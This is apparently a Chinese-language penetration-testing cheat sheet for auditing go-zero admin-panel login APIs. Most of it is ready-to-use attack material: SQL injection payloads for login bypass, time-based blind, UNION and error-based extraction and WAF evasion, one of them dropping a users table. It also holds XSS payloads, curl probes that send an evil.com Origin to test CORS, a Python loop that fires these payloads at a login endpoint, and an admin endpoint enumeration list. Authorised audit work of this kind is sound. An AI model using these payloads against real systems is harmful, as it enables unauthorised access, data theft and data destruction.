# 安全审计 Payload 与探测脚本

> 本文件收集后台管理系统 API 审计中可复用的 payload、curl 命令和 Python 探测片段。使用时替换 `https://target.com/api/.../login` 为实际地址。

## 1. 快速框架指纹

```bash
curl -i -X POST -H "Content-Type: application/json" \
  -d '{"userName":"admin","password":"123456"}' \
  https://target.com/api/.../login
```

go-zero 典型错误：
- `field "userName" is not set`
- `type mismatch for field "userName"`
- `string: ..., error: invalid character ...`

## 2. SQL 注入 Payload

### 2.1 基础万能密码

```json
{"userName":"admin","password":"' OR '1'='1"}
{"userName":"admin","password":"\" OR \"1\"=\"1\" --"}
{"userName":"admin' OR '1'='1' --","password":"123456"}
{"userName":"admin'--","password":"anything"}
{"userName":"admin'; DROP TABLE users; --","password":"123456"}
```

### 2.2 时间盲注

```json
{"userName":"admin' AND SLEEP(5) --","password":"123456"}
{"userName":"admin' AND BENCHMARK(1000000,MD5('a')) --","password":"123456"}
{"userName":"admin' AND pg_sleep(5) --","password":"123456"}
{"userName":"admin'; WAITFOR DELAY '0:0:5' --","password":"123456"}
```

### 2.3 报错/UNION 注入

```json
{"userName":"admin' UNION SELECT 1,2,3 --","password":"123456"}
{"userName":"admin' UNION SELECT 1,table_name,3 FROM information_schema.tables --","password":"123456"}
{"userName":"admin' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --","password":"123456"}
{"userName":"admin' AND updatexml(1, concat(0x7e, database()), 1) --","password":"123456"}
```

### 2.4 WAF 绕过

```json
{"userName":"admin' /*!50000AND*/ 1=1 --","password":"123456"}
{"userName":"admin' AND 0x61646d696e='admin' --","password":"123456"}
{"userName":"admin' AND CHAR(97,100,109,105,110)='admin' --","password":"123456"}
{"userName":"admin' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --","password":"123456"}
{"userName":"admin'%0bOR%0b'1'='1","password":"123456"}
{"userName":"admin'/**/OR/**/'1'='1","password":"123456"}
```

## 3. XSS Payload

适合提交到会被前端展示的字段（用户名、备注、搜索框等）：

```
<script>alert('xss')</script>
<img src=x onerror=alert('xss')>
<svg onload=alert('xss')>
"><script>alert(1)</script>
javascript:alert(1)
```

## 4. CORS 探测

```bash
# 预检请求
curl -i -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  https://target.com/api/.../login

# 实际 POST
curl -i -X POST \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"userName":"test","password":"test"}' \
  https://target.com/api/.../login
```

危险标志：
- `Access-Control-Allow-Origin: https://evil.com`（反射任意 Origin）
- `Access-Control-Allow-Credentials: true`（允许携带 Cookie）

## 5. Python 快速探测脚本

```python
import requests
import json

url = "https://target.com/api/.../login"

payloads = [
    {"userName":"admin","password":"123456"},
    {"userName":"admin","password":"' OR '1'='1"},
    {"userName":"admin' OR '1'='1' --","password":"123456"},
    {"userName":"admin' AND SLEEP(5) --","password":"123456"},
]

for p in payloads:
    r = requests.post(url, json=p, timeout=10)
    print(f"{p}: HTTP {r.status_code} | {r.text[:50]}")
```

## 6. 接口枚举列表

基于 go-zero 后台常见结构：

```
/api/sys/user/list
/api/sys/user/info
/api/sys/user/detail
/api/sys/user/page
/api/sys/user/search
/api/sys/role/list
/api/sys/menu/list
/api/sys/dept/list
/api/sys/dict/list
/api/sys/log/list
/api/sys/upload
/api/sys/captcha
```

## 7. 信息泄露检查项

- `Server` 头是否暴露版本：`nginx/1.18.0 (Ubuntu)`
- 错误响应是否包含 SQL 语句或堆栈
- `Access-Control-Allow-Origin` 是否反射
- 是否允许 `TRACE` 方法
- 是否缺少 `X-Content-Type-Options: nosniff`
